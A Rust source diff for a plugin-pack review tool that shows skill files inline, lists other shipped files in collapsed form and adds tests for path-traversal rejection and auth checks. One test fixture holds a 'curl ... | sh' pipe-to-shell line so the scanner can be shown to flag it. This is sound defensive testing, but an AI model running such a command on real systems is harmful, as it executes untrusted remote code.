@@ -19,7 +19,7 @@
 use std::collections::{BTreeMap, BTreeSet, HashMap};
 
 use arima_core::{
-    DecisionPayload, DecisionStatus, PackApproval, PackChange, PackEntry, PackLock, PackScan, PackSkill, PackSource, PackToolServer, ToolServer,
+    DecisionPayload, DecisionStatus, PackApproval, PackChange, PackEntry, PackFileSummary, PackLock, PackScan, PackSkill, PackSource, PackToolServer, ToolServer,
     ToolServerSource, ToolServerTransport, VisualDecision, WsServerEvent,
 };
 use arima_proxy::{is_imds_host_literal, normalize_scope_rule};
@@ -315,15 +315,150 @@ fn tools_text(server: &PackToolServer) -> String {
     format!("URL: {url}\n\n{}", tools.join("\n\n"))
 }
 
-/// Each file and tool server whose content differs from the approved entry, in full, before and after.
-fn changes(state: &AppState, before: Option<&PackEntry>, after: &PackEntry) -> Vec<PackChange> {
-    let mut out = Vec::new();
+/// Maximum total bytes of inline file diffs placed directly in a `PackReview` card JSON, keeping
+/// stored cards well under 300 KB even for large multi-hundred-file plugins.
+const MAX_INLINE_DIFF_BYTES: usize = 240 * 1024;
+
+/// Normalizes a relative path `raw` against `base_dir` (empty string for plugin root).
+/// Returns `None` if the path is absolute, a URL, or climbs above the plugin root.
+fn normalize_rel(base_dir: &str, raw: &str) -> Option<String> {
+    if raw.is_empty() || raw.starts_with('/') || raw.contains("://") {
+        return None;
+    }
+    let mut parts: Vec<&str> = base_dir.split('/').filter(|s| !s.is_empty()).collect();
+    for seg in raw.split('/') {
+        match seg {
+            "" | "." => {}
+            ".." => {
+                parts.pop()?;
+            }
+            other => parts.push(other),
+        }
+    }
+    (!parts.is_empty()).then(|| parts.join("/"))
+}
+
+/// Finds every file in `files` referenced by any `SKILL.md` in `files` (relative paths from the skill's folder,
+/// or plugin-root paths with `${CLAUDE_PLUGIN_ROOT}` / `${PLUGIN_ROOT}`).
+fn referenced_paths(files: &BTreeMap<String, String>) -> BTreeSet<String> {
+    const ROOT_PREFIXES: [&str; 4] = ["${CLAUDE_PLUGIN_ROOT}/", "$CLAUDE_PLUGIN_ROOT/", "${PLUGIN_ROOT}/", "$PLUGIN_ROOT/"];
+    let mut out = BTreeSet::new();
+    for (path, content) in files {
+        if path != "SKILL.md" && !path.ends_with("/SKILL.md") {
+            continue;
+        }
+        let skill_dir = path.rsplit_once('/').map_or("", |(d, _)| d);
+        for raw in content.split(|c: char| c.is_whitespace() || matches!(c, '(' | ')' | '[' | ']' | '<' | '>' | '"' | '\'' | '`' | ',' | ';')) {
+            let trimmed = raw.trim_matches(|c: char| matches!(c, '.' | ':' | '*' | '!' | '?'));
+            let cleaned = trimmed.split(['#', '?']).next().unwrap_or("");
+            if cleaned.is_empty() || cleaned.contains("://") {
+                continue;
+            }
+            let (root_only, candidate) = ROOT_PREFIXES
+                .iter()
+                .find_map(|p| cleaned.strip_prefix(p).map(|rest| (true, rest)))
+                .unwrap_or((false, cleaned));
+            let is_dir_hint = candidate.ends_with('/');
+            let mut try_match = |norm: Option<String>| {
+                let Some(norm) = norm else { return };
+                if files.contains_key(&norm) {
+                    out.insert(norm);
+                } else if is_dir_hint {
+                    let prefix = format!("{norm}/");
+                    for p in files.keys() {
+                        if p.starts_with(&prefix) {
+                            out.insert(p.clone());
+                        }
+                    }
+                }
+            };
+            if root_only {
+                try_match(normalize_rel("", candidate));
+            } else {
+                try_match(normalize_rel(skill_dir, candidate));
+                if candidate.contains('/') {
+                    try_match(normalize_rel("", candidate));
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Plugin-relative skill folders recorded in `entry.skills`.
+fn skill_dirs(entry: &PackEntry) -> BTreeSet<String> {
+    let prefix = entry.source.path.as_deref().filter(|d| *d != ".").map(|d| format!("{d}/"));
+    entry
+        .skills
+        .values()
+        .map(|s| match &prefix {
+            Some(p) => s.path.strip_prefix(p).unwrap_or(&s.path).to_owned(),
+            None => s.path.clone(),
+        })
+        .collect()
+}
+
+fn is_primary_file(path: &str, dirs: &BTreeSet<String>, referenced: &BTreeSet<String>) -> bool {
+    path.starts_with("skills/")
+        || path.starts_with("agents/")
+        || path.starts_with("resources/")
+        || referenced.contains(path)
+        || dirs.iter().any(|d| path == d || path.starts_with(&format!("{d}/")))
+}
+
+fn matches_finding_path(line: &str, path: &str) -> bool {
+    line.strip_prefix(path)
+        .and_then(|rest| rest.strip_prefix(':'))
+        .and_then(|rest| rest.split_once(' '))
+        .is_some_and(|(num, _)| !num.is_empty() && num.bytes().all(|b| b.is_ascii_digit()))
+}
+
+fn file_scan_summary(path: &str, scan: &PackScan) -> (String, u32) {
+    let blocked = scan.blocked.iter().filter(|l| matches_finding_path(l, path)).count() as u32;
+    let warnings = scan.warnings.iter().filter(|l| matches_finding_path(l, path)).count() as u32;
+    if blocked > 0 {
+        ("block".into(), blocked + warnings)
+    } else if warnings > 0 {
+        ("warn".into(), warnings)
+    } else {
+        ("clean".into(), 0)
+    }
+}
+
+/// Primary changes (skills/, agents/, resources/, files a SKILL.md references, and tool servers) shown with full
+/// inline diffs, plus collapsed summaries for all other changed shipped files (fetched on expand from the content-
+/// addressed plugin store).
+fn changes(state: &AppState, before: Option<&PackEntry>, after: &PackEntry) -> (Vec<PackChange>, Vec<PackFileSummary>) {
+    let mut inline = Vec::new();
+    let mut other = Vec::new();
+    let mut inline_bytes = 0usize;
     if before.is_none_or(|b| b.tree != after.tree) {
-        let (old, new) = (before.map(|b| stored_tree(state, &b.tree)).unwrap_or_default(), stored_tree(state, &after.tree));
+        let old = before.map(|b| stored_tree(state, &b.tree)).unwrap_or_default();
+        let new = stored_tree(state, &after.tree);
+        let mut referenced = referenced_paths(&new);
+        referenced.extend(referenced_paths(&old));
+        let mut dirs = skill_dirs(after);
+        if let Some(b) = before {
+            dirs.extend(skill_dirs(b));
+        }
         for path in old.keys().chain(new.keys()).collect::<BTreeSet<_>>() {
             let (b, a) = (old.get(path), new.get(path));
-            if b != a {
-                out.push(PackChange { kind: "file".into(), name: path.clone(), before: b.cloned(), after: a.cloned() });
+            if b == a {
+                continue;
+            }
+            let diff_bytes = b.map_or(0, String::len) + a.map_or(0, String::len);
+            if is_primary_file(path, &dirs, &referenced) && inline_bytes + diff_bytes <= MAX_INLINE_DIFF_BYTES {
+                inline_bytes += diff_bytes;
+                inline.push(PackChange { kind: "file".into(), name: path.clone(), before: b.cloned(), after: a.cloned() });
+            } else {
+                let change = match (b, a) {
+                    (None, Some(_)) => "added",
+                    (Some(_), None) => "removed",
+                    _ => "changed",
+                };
+                let bytes = u32::try_from(a.or(b).map_or(0, String::len)).unwrap_or(u32::MAX);
+                let (scan, findings) = file_scan_summary(path, &after.scan);
+                other.push(PackFileSummary { path: path.clone(), change: change.into(), bytes, scan, findings });
             }
         }
     }
@@ -333,10 +468,42 @@ fn changes(state: &AppState, before: Option<&PackEntry>, after: &PackEntry) -> V
     for name in names {
         let (b, a) = (old_servers.get(name), after.tool_servers.get(name));
         if b.map(|s| (&s.transport, &s.tools_sha256)) != a.map(|s| (&s.transport, &s.tools_sha256)) {
-            out.push(PackChange { kind: "toolServer".into(), name: name.clone(), before: b.map(tools_text), after: a.map(tools_text) });
+            inline.push(PackChange { kind: "toolServer".into(), name: name.clone(), before: b.map(tools_text), after: a.map(tools_text) });
         }
     }
-    out
+    (inline, other)
+}
+
+/// Reads the full before/after text of one shipped file listed on a `PackReview` decision, straight from the
+/// content-addressed plugin store, so collapsed files load on expand without bloating the stored card JSON.
+pub fn read_review_file(state: &AppState, project_id: &str, decision_id: &str, path: &str) -> Result<(Option<String>, Option<String>), String> {
+    if !skills::safe_repo_path(path) {
+        return Err("Invalid file path.".into());
+    }
+    let decision = state
+        .inner
+        .decisions
+        .get(decision_id)
+        .map_err(|e| e.to_string())?
+        .filter(|d| d.project_id == project_id)
+        .ok_or_else(|| "Decision not found.".to_owned())?;
+    let DecisionPayload::PackReview { from_tree, to_tree, changed, other_files, .. } = &decision.payload else {
+        return Err("That decision is not a pack review.".into());
+    };
+    let listed = other_files.iter().any(|f| f.path == path) || changed.iter().any(|c| c.kind == "file" && c.name == path);
+    if !listed {
+        return Err("That file is not part of this pack review.".into());
+    }
+    let root = skills::data_root(state)?;
+    let read_side = |tree: &str| {
+        skills::read_stored_file(&root, tree, STORED_PLUGIN, path).map(|b| String::from_utf8_lossy(&b).into_owned())
+    };
+    let before = from_tree.as_deref().and_then(read_side);
+    let after = read_side(to_tree);
+    if before.is_none() && after.is_none() {
+        return Err("The stored files for this review are no longer on disk.".into());
+    }
+    Ok((before, after))
 }
 
 fn card(state: &AppState, project_id: &str, id: &str, before: Option<&PackEntry>, after: &PackEntry, notes: &[String], card_id: &str) -> VisualDecision {
@@ -351,6 +518,7 @@ fn card(state: &AppState, project_id: &str, id: &str, before: Option<&PackEntry>
     for n in notes {
         details.push_str(&format!("\n\n{n}"));
     }
+    let (changed, other_files) = changes(state, before, after);
     VisualDecision {
         id: card_id.to_owned(),
         project_id: project_id.to_owned(),
@@ -365,7 +533,10 @@ fn card(state: &AppState, project_id: &str, id: &str, before: Option<&PackEntry>
             pack: id.to_owned(),
             from: before.map(|b| b.source.commit.clone()),
             to: after.source.commit.clone(),
-            changed: changes(state, before, after),
+            from_tree: before.map(|b| b.tree.clone()),
+            to_tree: after.tree.clone(),
+            changed,
+            other_files,
             egress: after.egress.clone(),
             secrets: after.secrets.clone(),
             ignored: after.ignored.clone(),
@@ -920,14 +1091,19 @@ mod tests {
         assert!(entry.approved.is_none() && entry.tool_servers.len() == 1);
 
         let card = review(&state, &pid, &id);
-        let DecisionPayload::PackReview { from, to, changed, ignored, egress, secrets, .. } = &card.payload else { panic!("not a pack review") };
+        let DecisionPayload::PackReview { from, to, changed, other_files, ignored, egress, secrets, .. } = &card.payload else { panic!("not a pack review") };
         assert!(card.owner_only && from.is_none() && *to == commit);
         assert_eq!(
             changed.iter().map(|c| (c.kind.as_str(), c.name.as_str())).collect::<Vec<_>>(),
-            [("file", ".claude-plugin/plugin.json"), ("file", "agents/helper.md"), ("file", "skills/review/SKILL.md"), ("toolServer", "acme")],
-            "every file that ships, relative to the plugin; hooks and commands don't ship"
+            [("file", "agents/helper.md"), ("file", "skills/review/SKILL.md"), ("toolServer", "acme")],
+            "primary files (skills/, agents/, resources/, SKILL.md refs) and tool servers show inline"
         );
-        assert!(changed[2].after.as_deref().unwrap().contains("Review the diff.") && changed[3].after.as_deref().unwrap().contains("Search docs."), "full texts, never truncated");
+        assert_eq!(
+            other_files.iter().map(|f| (f.path.as_str(), f.change.as_str(), f.scan.as_str())).collect::<Vec<_>>(),
+            [(".claude-plugin/plugin.json", "added", "clean")],
+            "other shipped files show collapsed with path, size, and scan status"
+        );
+        assert!(changed[1].after.as_deref().unwrap().contains("Review the diff.") && changed[2].after.as_deref().unwrap().contains("Search docs."), "full texts, never truncated");
         assert_eq!((ignored.len(), egress.len(), secrets.len()), (4, 1, 1));
 
         // Nothing reaches agents before approval.
@@ -1207,27 +1383,28 @@ mod tests {
         let tree = entry.tree.clone();
         stage(&state, &pid, &id, entry, &[]).unwrap();
         let card = review(&state, &pid, &id);
-        let DecisionPayload::PackReview { changed, .. } = &card.payload else { panic!() };
+        let DecisionPayload::PackReview { changed, other_files, .. } = &card.payload else { panic!() };
         assert_eq!(
             changed.iter().map(|c| (c.kind.as_str(), c.name.as_str())).collect::<Vec<_>>(),
             [
-                ("file", ".claude-plugin/marketplace.json"),
-                ("file", ".claude-plugin/plugin.json"),
                 ("file", "agents/zoom_out.md"),
                 ("file", "resources/execution_instructions.md"),
                 ("file", "skills/egm-review-loop/SKILL.md"),
                 ("file", "skills/egm-review/SKILL.md"),
             ],
-            "the review shows every text file that ships"
+            "the review shows primary files inline"
         );
-        assert_eq!(changed[3].after.as_deref(), Some("Shared rules."));
+        assert_eq!(
+            other_files.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(),
+            [".claude-plugin/marketplace.json", ".claude-plugin/plugin.json"],
+            "non-primary shipped files appear in the collapsed list"
+        );
+        assert_eq!(changed[1].after.as_deref(), Some("Shared rules."));
         assert!(card.details.contains(&tree[..12]), "the card names the files hash");
         answer(&state, &card.id, DecisionStatus::Resolved);
 
         let r = role(&state, &pid);
         crate::team_edit::set_team_mode(&state, &pid, &[json!("container")]).unwrap();
-        crate::team_edit::update_role(&state, &pid, &[json!(r), json!({ "cli": "claude", "skills": [format!("{id}@egm-review"), format!("{id}@egm-review-loop")] })]).unwrap();
-        let agent = seat(&state, &pid)["id"].as_str().unwrap().to_owned();
         let ws = tmp.path().join("ws");
         let rt = crate::runtime::AgentRuntime::new(crate::runtime::RuntimeConfig {
             enabled: true,
@@ -1239,28 +1416,76 @@ mod tests {
             egress_port: 8420,
             hq_container: None,
         });
-        let body = rt.plan(&state, &pid, &agent).unwrap().body;
+        let agent = seat(&state, &pid)["id"].as_str().unwrap().to_owned();
         let host = format!("/host/ws/.arima-skills/{tree}/plugin");
         let root = "/workspace/.agent-home/.arima/plugins/acme/egm/egm";
-        assert_eq!(
-            body["HostConfig"]["Binds"].as_array().unwrap()[1..],
-            [
-                json!(format!("{host}:{root}:ro")),
-                json!(format!("{host}/skills/egm-review:/workspace/.agent-home/.claude/skills/egm-review:ro")),
-                json!(format!("{host}/skills/egm-review-loop:/workspace/.agent-home/.claude/skills/egm-review-loop:ro")),
-            ],
-            "the whole plugin read-only, and each skill from inside it"
-        );
-        let env: Vec<&str> = body["Env"].as_array().unwrap().iter().filter_map(Value::as_str).collect();
-        assert!(env.contains(&format!("CLAUDE_PLUGIN_ROOT={root}").as_str()) && env.contains(&format!("PLUGIN_ROOT={root}").as_str()), "{env:?}");
 
-        // On the host copy, every relative path the skill names resolves inside the stored tree.
-        let stored = ws.join(".arima-skills").join(&tree).join("plugin").canonicalize().unwrap();
-        for rel in refs {
-            let target = stored.join("skills/egm-review").join(rel).canonicalize().unwrap_or_else(|e| panic!("{rel}: {e}"));
-            assert!(target.starts_with(&stored) && target.is_file(), "{rel}");
+        // Verify both Codex and Claude mount the plugin tree :ro and a :ro skills_dir view of symlinks into it,
+        // and that container-side physical path resolution from `<skills_dir>/<name>/<rel>` lands inside the plugin.
+        for (cli, skills_dir) in [("codex", "/workspace/.agent-home/.agents/skills"), ("claude", "/workspace/.agent-home/.claude/skills")] {
+            crate::team_edit::update_role(&state, &pid, &[json!(r), json!({ "cli": cli, "skills": [format!("{id}@egm-review"), format!("{id}@egm-review-loop")] })]).unwrap();
+            let body = rt.plan(&state, &pid, &agent).unwrap().body;
+            let binds: Vec<&str> = body["HostConfig"]["Binds"].as_array().unwrap().iter().filter_map(Value::as_str).collect();
+            assert_eq!(binds.len(), 3, "{cli}: workspace + plugin tree + skills view: {binds:?}");
+            assert_eq!(binds[1], format!("{host}:{root}:ro"), "{cli}: whole plugin mounted read-only");
+            let view_prefix = "/host/ws/.arima-skills/views/";
+            let view_suffix = format!(":{skills_dir}:ro");
+            assert!(binds[2].starts_with(view_prefix) && binds[2].ends_with(&view_suffix), "{cli}: {}", binds[2]);
+            let view_hash = binds[2].strip_prefix(view_prefix).unwrap().strip_suffix(&view_suffix).unwrap();
+
+            // Pre-created mountpoints on host keep parent CLI folders owned by the container user, not root.
+            let agent_ws = ws.join("demo").join(&agent);
+            assert!(agent_ws.join(skills_dir.strip_prefix("/workspace/").unwrap()).is_dir(), "{cli}: skills_dir mountpoint pre-created");
+            assert!(agent_ws.join(root.strip_prefix("/workspace/").unwrap()).is_dir(), "{cli}: plugin mountpoint pre-created");
+
+            let env: Vec<&str> = body["Env"].as_array().unwrap().iter().filter_map(Value::as_str).collect();
+            assert!(env.contains(&format!("CLAUDE_PLUGIN_ROOT={root}").as_str()) && env.contains(&format!("PLUGIN_ROOT={root}").as_str()), "{env:?}");
+
+            // Simulate Linux VFS path resolution across the container's bind mounts from `<skills_dir>/egm-review/<rel>`.
+            let host_mounts: Vec<(&str, PathBuf)> = binds[1..]
+                .iter()
+                .map(|b| {
+                    let parts: Vec<&str> = b.split(':').collect();
+                    assert_eq!(parts[2], "ro", "every skill/plugin bind is read-only: {b}");
+                    let local_src = ws.join(parts[0].strip_prefix("/host/ws/").unwrap());
+                    (parts[1], local_src)
+                })
+                .collect();
+            let resolve_in_container = |container_path: &str| -> PathBuf {
+                let mut cur = String::new();
+                for seg in container_path.split('/').filter(|s| !s.is_empty()) {
+                    if seg == "." {
+                        continue;
+                    }
+                    if seg == ".." {
+                        cur = cur.rsplit_once('/').map_or(String::new(), |(p, _)| p.to_owned());
+                        continue;
+                    }
+                    cur = format!("{cur}/{seg}");
+                    // If `cur` sits inside a bind mount and is a symlink on the host, follow it physically.
+                    if let Some((mount_dst, host_src)) = host_mounts.iter().find(|(dst, _)| cur == *dst || cur.starts_with(&format!("{dst}/"))) {
+                        let rel = cur.strip_prefix(mount_dst).unwrap().trim_start_matches('/');
+                        let host_path = if rel.is_empty() { host_src.clone() } else { host_src.join(rel) };
+                        if std::fs::symlink_metadata(&host_path).is_ok_and(|m| m.file_type().is_symlink()) {
+                            cur = std::fs::read_link(&host_path).unwrap().to_str().unwrap().to_owned();
+                        }
+                    }
+                }
+                let (_, host_src) = host_mounts.iter().find(|(dst, _)| cur.starts_with(&format!("{dst}/"))).unwrap_or_else(|| panic!("{cli}: {container_path} resolved outside plugin mounts to {cur}"));
+                let rel = cur.strip_prefix(root).unwrap_or_else(|| panic!("{cli}: {container_path} resolved to {cur}, not under {root}")).trim_start_matches('/');
+                host_src.join(rel)
+            };
+
+            let stored = ws.join(".arima-skills").join(&tree).join("plugin").canonicalize().unwrap();
+            let view_dir = ws.join(".arima-skills/views").join(view_hash);
+            assert_eq!(std::fs::read_link(view_dir.join("egm-review")).unwrap(), PathBuf::from(format!("{root}/skills/egm-review")));
+            assert_eq!(std::fs::read_link(view_dir.join("egm-review-loop")).unwrap(), PathBuf::from(format!("{root}/skills/egm-review-loop")));
+            for rel in refs {
+                let target = resolve_in_container(&format!("{skills_dir}/egm-review/{rel}")).canonicalize().unwrap_or_else(|e| panic!("{cli} {rel}: {e}"));
+                assert!(target.starts_with(&stored) && target.is_file(), "{cli}: {rel} -> {}", target.display());
+            }
+            assert!(!stored.join(".claude-plugin/icon.png").exists() && !stored.join("hooks").exists());
         }
-        assert!(!stored.join(".claude-plugin/icon.png").exists() && !stored.join("hooks").exists());
 
         // A change to a shared file outside every skill folder needs a new approval.
         commit(files("Shared rules, changed."));
@@ -1275,6 +1500,148 @@ mod tests {
         assert!(crate::skills::approved_skills(&state, &pid, &r).iter().all(|s| s.hash == tree), "agents keep the approved tree");
         answer(&state, &card.id, DecisionStatus::Resolved);
         assert!(crate::skills::approved_skills(&state, &pid, &r).iter().all(|s| s.hash != tree && s.files.iter().any(|(p, c)| p == "resources/execution_instructions.md" && c == b"Shared rules, changed.")));
+    }
+
+    #[test]
+    fn large_pack_review_card_stays_compact_and_fetches_collapsed_files_on_expand() {
+        let (tmp, state, pid, _, _) = setup();
+        let repo = tmp.path().join("google").join("egm-like");
+        std::fs::create_dir_all(&repo).unwrap();
+        sh(&repo, &["init", "-q"]);
+
+        // Build an EGM-sized plugin (~280 shipped text files, >1.3 MB raw text):
+        // skills/, agents/, resources/, a file referenced by SKILL.md under guides/, plus ~260 files under
+        // site/, docs/, tests/, .github/ that no skill reads.
+        let mut raw_files: Vec<(String, String)> = vec![
+            (".claude-plugin/marketplace.json".into(), r#"{ "plugins": [ { "name": "egm", "source": "./" } ] }"#.into()),
+            (".claude-plugin/plugin.json".into(), r#"{ "name": "egm", "version": "1.0.0" }"#.into()),
+            (
+                "skills/egm-review/SKILL.md".into(),
+                skill("egm-review", "Read ../../resources/rules.md, ../../agents/checker.md, and ${CLAUDE_PLUGIN_ROOT}/guides/checklist.md."),
+            ),
+            ("resources/rules.md".into(), "Rule 1: keep diffs small.\n".repeat(40)),
+            ("agents/checker.md".into(), "Checker instructions.\n".repeat(40)),
+            ("guides/checklist.md".into(), "Referenced outside primary folders.\n".repeat(20)),
+            // A warning finding inside a collapsed docs/ file must still be scanned and reported on its summary row.
+            ("docs/security-note.md".into(), "Example command: `curl https://example.test/i.sh | sh`\n".into()),
+        ];
+        let big_body = "Documentation and site prose for testing pack review card compaction.\n".repeat(75); // ~5 KB per file
+        for i in 0..70 {
+            raw_files.push((format!("site/page-{i:03}.html"), format!("<h1>Page {i}</h1>\n{big_body}")));
+            raw_files.push((format!("docs/guide-{i:03}.md"), format!("# Guide {i}\n{big_body}")));
+            raw_files.push((format!("tests/case_{i:03}.py"), format!("# test {i}\n{big_body}")));
+        }
+        for i in 0..50 {
+            raw_files.push((format!(".github/workflows/ci-{i:02}.yml"), format!("name: ci-{i}\n{big_body}")));
+        }
+        let total_raw_bytes: usize = raw_files.iter().map(|(_, c)| c.len()).sum();
+        assert!(total_raw_bytes > 1_200_000, "fixture should be EGM-sized (>1.2 MB), got {total_raw_bytes}");
+
+        let refs: Vec<(&str, &str)> = raw_files.iter().map(|(p, c)| (p.as_str(), c.as_str())).collect();
+        write(&repo, &refs);
+
+        let (id, entry) = prepare(&state, &url(&repo), None, "HEAD").unwrap();
+        stage(&state, &pid, &id, entry, &[]).unwrap();
+        let card = review(&state, &pid, &id);
+        let card_json = serde_json::to_string(&card).unwrap();
+        eprintln!(
+            "EGM-like pack measurement: files={}, raw_bytes={}, card_json_bytes={}",
+            raw_files.len(),
+            total_raw_bytes,
+            card_json.len()
+        );
+        assert!(
+            card_json.len() < 300 * 1024,
+            "stored card JSON must stay under 300 KB for an EGM-sized pack, got {} bytes",
+            card_json.len()
+        );
+
+        let DecisionPayload::PackReview { changed, other_files, findings, .. } = &card.payload else { panic!() };
+        assert_eq!(
+            changed.iter().map(|c| c.name.as_str()).collect::<Vec<_>>(),
+            ["agents/checker.md", "guides/checklist.md", "resources/rules.md", "skills/egm-review/SKILL.md"],
+            "inline full diffs include only skills/, agents/, resources/, and files referenced by SKILL.md"
+        );
+        assert_eq!(other_files.len(), raw_files.len() - 4, "every remaining shipped file is listed collapsed");
+        let warned = other_files.iter().find(|f| f.path == "docs/security-note.md").unwrap();
+        assert_eq!((warned.change.as_str(), warned.scan.as_str(), warned.findings), ("added", "warn", 1));
+        assert!(findings.iter().any(|f| f.contains("docs/security-note.md")), "collapsed files are still scanned");
+
+        // Expanding a collapsed file fetches its exact text from the content-addressed store.
+        let (before, after) = read_review_file(&state, &pid, &card.id, "docs/guide-000.md").unwrap();
+        assert!(before.is_none());
+        assert!(after.as_deref().unwrap().starts_with("# Guide 0\n"));
+        assert!(read_review_file(&state, &pid, &card.id, "../escape").is_err());
+        assert!(read_review_file(&state, &pid, &card.id, "not-in-pack.md").is_err());
+
+        // Approving and then modifying a collapsed file under docs/ still changes the tree hash and needs re-approval.
+        answer(&state, &card.id, DecisionStatus::Resolved);
+        write(&repo, &[("docs/guide-000.md", "# Guide 0\nUpdated doc content.\n")]);
+        let (_, next) = prepare(&state, &url(&repo), None, "HEAD").unwrap();
+        assert!(stage(&state, &pid, &id, next, &[]).unwrap(), "changing a collapsed file still files a review");
+        let update_card = review(&state, &pid, &id);
+        let DecisionPayload::PackReview { changed, other_files, .. } = &update_card.payload else { panic!() };
+        assert!(changed.is_empty());
+        assert_eq!(other_files.len(), 1);
+        assert_eq!((other_files[0].path.as_str(), other_files[0].change.as_str()), ("docs/guide-000.md", "changed"));
+        let (before, after) = read_review_file(&state, &pid, &update_card.id, "docs/guide-000.md").unwrap();
+        assert!(before.as_deref().unwrap().starts_with("# Guide 0\nDocumentation"));
+        assert_eq!(after.as_deref(), Some("# Guide 0\nUpdated doc content.\n"));
+    }
+
+    #[tokio::test]
+    async fn pack_file_http_route_serves_collapsed_diffs_with_auth_and_path_checks() {
+        use axum::body::Body;
+        use axum::http::{Request, StatusCode};
+        use tower::ServiceExt;
+
+        let (_tmp, state, pid, repo, _) = setup();
+        let (id, _) = read_and_stage(&state, &pid, &repo, "HEAD", "Search docs.");
+        let card = review(&state, &pid, &id);
+        let app = crate::router_with_state(state.clone());
+
+        let url = format!("/api/projects/{pid}/decisions/{}/pack-file?path=.claude-plugin/plugin.json", card.id);
+        let unauthed = app
+            .clone()
+            .oneshot(Request::builder().uri(&url).body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(unauthed.status(), StatusCode::UNAUTHORIZED);
+
+        let (token, _) = state
+            .inner
+            .auth
+            .exchange_bootstrap_token(&state.inner.config.bootstrap_token, &state.inner.config.bootstrap_token, true, None, "test".into())
+            .unwrap();
+        let authed = app
+            .clone()
+            .oneshot(
+                Request::builder()
+                    .uri(&url)
+                    .header("cookie", format!("hq_sid={token}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(authed.status(), StatusCode::OK);
+        let bytes = axum::body::to_bytes(authed.into_body(), 1024 * 1024).await.unwrap();
+        let body: Value = serde_json::from_slice(&bytes).unwrap();
+        assert_eq!(body["path"], ".claude-plugin/plugin.json");
+        assert!(body["before"].is_null());
+        assert!(body["after"].as_str().unwrap().contains("\"acme-tools\""));
+
+        let traversal = app
+            .oneshot(
+                Request::builder()
+                    .uri(format!("/api/projects/{pid}/decisions/{}/pack-file?path=../secret", card.id))
+                    .header("cookie", format!("hq_sid={token}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(traversal.status(), StatusCode::BAD_REQUEST);
     }
 
     #[test]
